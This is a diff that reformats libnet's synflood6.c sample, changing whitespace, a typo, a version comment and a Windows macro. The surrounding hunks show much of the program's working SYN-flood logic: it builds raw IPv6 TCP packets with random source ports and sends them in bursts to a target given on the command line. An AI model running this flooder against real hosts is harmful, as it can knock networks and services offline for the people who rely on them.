@@ -1,9 +1,7 @@
 /*
- *  $Id: synflood6.c,v 1.2 2004/03/01 20:26:12 mike Exp $
- *
  *  Poseidon++ (c) 1996 - 2003 Mike D. Schiffman <mike@infonexus.com>
  *  SYN flooder rewritten for no good reason.  Again as libnet test module.
- *  Again for libnet 1.1.
+ *  Again for libnet 1.2.
  *  All rights reserved.
  *
  * Modifications for ipv6 by Stefan Schlott <stefan@ploing.de>
@@ -55,7 +53,7 @@ main(int argc, char **argv)
     char *cp;
     char errbuf[LIBNET_ERRBUF_SIZE];
     int i, c, packet_amt, burst_int, burst_amt, build_ip;
-	char srcname[100],dstname[100];
+    char srcname[100],dstname[100];
 
     packet_amt  = 0;
     burst_int   = 0;
@@ -64,12 +62,12 @@ main(int argc, char **argv)
     printf("libnet 1.1 syn flooding: TCP6[raw]\n");
 
     /*
-     *  Initialize the library.  Root priviledges are required.
+     *  Initialize the library.  Root privileges are required.
      */
     l = libnet_init(
-            LIBNET_RAW6,                            /* injection type */
-            NULL,                                   /* network interface */
-            errbuf);                                /* error buffer */
+            LIBNET_RAW6,            /* injection type */
+            NULL,                   /* network interface */
+            errbuf);                /* error buffer */
 
     if (l == NULL)
     {
@@ -89,7 +87,7 @@ main(int argc, char **argv)
                 }
                 *cp++ = 0;
                 dst_prt = (u_short)atoi(cp);
-				dst_ip = libnet_name2addr6(l, optarg, 1);
+                dst_ip = libnet_name2addr6(l, optarg, 1);
                 if (strncmp((char*)&dst_ip,(char*)&in6addr_error,sizeof(in6addr_error))==0)
                 {
                     fprintf(stderr, "Bad IP6 address: %s\n", optarg);
@@ -111,31 +109,29 @@ main(int argc, char **argv)
         }
     }
 
-	src_ip = libnet_name2addr6(l, "0:0:0:0:0:0:0:1", LIBNET_DONT_RESOLVE);
-	/*src_ip = libnet_name2addr6(l, "3ffe:400:60:4d:250:fcff:fe2c:a9cd", LIBNET_DONT_RESOLVE);
-	dst_prt = 113;
-	dst_ip = libnet_name2addr6(l, "nathan.ip6.uni-ulm.de", LIBNET_RESOLVE);
-	packet_amt = 1;*/
+    src_ip = libnet_name2addr6(l, "0:0:0:0:0:0:0:1", LIBNET_DONT_RESOLVE);
+    /*src_ip = libnet_name2addr6(l, "3ffe:400:60:4d:250:fcff:fe2c:a9cd", LIBNET_DONT_RESOLVE);
+    dst_prt = 113;
+    dst_ip = libnet_name2addr6(l, "nathan.ip6.uni-ulm.de", LIBNET_RESOLVE);
+    packet_amt = 1;*/
 
     if (!dst_prt || strncmp((char*)&dst_ip,(char*)&in6addr_error,sizeof(in6addr_error))==0 || !packet_amt)
     {
         usage(argv[0]);
         exit(EXIT_FAILURE);
     }
-	
-	
 
     libnet_seed_prand(l);
-	libnet_addr2name6_r(src_ip,1,srcname,sizeof(srcname));
-	libnet_addr2name6_r(dst_ip,1,dstname,sizeof(dstname));
+    libnet_addr2name6_r(src_ip,1,srcname,sizeof(srcname));
+    libnet_addr2name6_r(dst_ip,1,dstname,sizeof(dstname));
 
     for(t = LIBNET_PTAG_INITIALIZER, build_ip = 1; burst_amt--;)
     {
         for (i = 0; i < packet_amt; i++)
         {
-			char payload[56];
-			int i;
-			for (i=0; i<56; i++) payload[i]='A'+((char)(i%26));
+            char payload[56];
+            int i;
+            for (i=0; i<56; i++) payload[i]='A'+((char)(i%26));
             t = libnet_build_tcp(
                     src_prt = libnet_get_prand(LIBNET_PRu16),
                     dst_prt,
@@ -153,14 +149,14 @@ main(int argc, char **argv)
 
             if (build_ip)
             {
-                build_ip = 0;				
-		printf("Packet len = %ld\n", (long)LIBNET_ICMPV6_H+sizeof(payload));
+                build_ip = 0;
+        printf("Packet len = %ld\n", (long)LIBNET_ICMPV6_H+sizeof(payload));
                 libnet_build_ipv6(0,0,
- 				    LIBNET_TCP_H,
- 		            IPPROTO_TCP,
-		            64,
-		            src_ip,
-		            dst_ip,
+                    LIBNET_TCP_H,
+                    IPPROTO_TCP,
+                    64,
+                    src_ip,
+                    dst_ip,
                     NULL,
                     0,
                     l,
@@ -176,14 +172,14 @@ main(int argc, char **argv)
             {
                 fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
             }
-#if !(__WIN32__)
+#if !(_WIN32)
             usleep(250);
 #else
             Sleep(250);
 #endif
 
         }
-#if !(__WIN32__)
+#if !(_WIN32)
         sleep(burst_int);
 #else
         Sleep(burst_int * 1000);
